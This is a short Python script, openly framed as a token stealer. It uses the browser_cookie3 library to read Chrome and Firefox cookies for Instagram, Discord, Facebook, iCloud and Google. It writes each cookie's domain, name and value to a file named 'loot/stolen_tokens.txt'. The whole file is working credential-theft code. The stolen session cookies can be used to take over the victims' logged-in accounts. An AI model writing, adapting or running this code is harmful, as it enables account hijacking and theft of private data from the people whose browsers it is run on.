import browser_cookie3
import os

TARGET_DOMAINS = [
    "instagram.com",
    "discord.com",
    "facebook.com",
    "icloud.com",
    "google.com"
]

LOOT_DIR = "loot"
OUTPUT_FILE = os.path.join(LOOT_DIR, "stolen_tokens.txt")

def run():
    print("[*] Harvesting tokens from Chrome and Firefox...\n")
    all_cookies = []

    for domain in TARGET_DOMAINS:
        print(f"[+] Searching for cookies from: {domain}")
        try:
            cj_chrome = browser_cookie3.chrome(domain_name=domain)
            cj_firefox = browser_cookie3.firefox(domain_name=domain)
            cookies = list(cj_chrome) + list(cj_firefox)

            if cookies:
                for cookie in cookies:
                    entry = f"{cookie.domain}\t{cookie.name}\t{cookie.value}"
                    all_cookies.append(entry)
                    print(f"  -> Found cookie: {cookie.name}")
            else:
                print("  -> No cookies found.")
        except Exception as e:
            print(f"  [!] Error reading cookies for {domain}: {e}")

    if all_cookies:
        print(f"\n[💾] Writing {len(all_cookies)} cookies to {OUTPUT_FILE}")
        with open(OUTPUT_FILE, "w") as f:
            for cookie in all_cookies:
                f.write(cookie + "\n")
        print("[✅] Done.")
    else:
        print("[!] No cookies found. Are you running this on a browser with logins?")

if __name__ == "__main__":
    run()
